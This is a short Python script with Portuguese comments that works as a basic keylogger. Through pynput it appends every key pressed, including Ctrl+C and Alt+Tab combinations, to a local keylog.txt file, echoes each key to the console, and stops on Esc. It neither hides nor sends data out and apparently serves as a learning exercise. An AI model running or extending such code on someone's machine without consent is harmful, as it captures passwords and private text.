from pynput import keyboard
# Dicionario para manter o estado das teclas modificadoras

modifier_keys = {'ctrl': False, 'alt': False, 'shift': False}

def on_press(key):
    # Atualizar o estado das teclas
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        modifier_keys['ctrl'] = True

    elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
        modifier_keys['alt'] = True

    elif key == keyboard.Key.shift:
        modifier_keys['shift'] = True

    # Verificar combinações de teclas

    if modifier_keys['ctrl'] and key == keyboard.KeyCode.from_char('c'):
        print('Ctrl+c pressed\n')
        with open("keylog.txt","a") as log_file:
            log_file.write('Ctrl+c pressed\n')

    elif modifier_keys['alt'] and key == keyboard.Key.tab:
        print('Alt+Tab preesed ')
        with open("keylog.txt", "a") as log_file:
            log_file.write('Alt+Tab pressed\n')

    else:
        try:
            print('Alphanumeric key {0} pressed'.format(key.char))
            with open("keylog.txt", "a") as log_file:
                log_file.write('{0} pressed\n'.format(key.char))

        except AttributeError:
            print('Special key {0} pressed\n'.format(key))
            with open("keylog.txt", "a") as log_file:
                log_file.write('{0} pressed\n'.format(key))

def on_release(key):
    # Atualizar o estado das teclas
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        modifier_keys['ctrl'] = False
    elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
        modifier_keys['alt'] = False

    elif key == keyboard.Key.shift:
        modifier_keys['shift'] = False

        # Parar o listener
    if key == keyboard.Key.esc:
        return  False

# Coletar eventos ate o esc ser pressionado

with keyboard.Listener(on_press = on_press, on_release= on_release) as listener:
    listener.join()
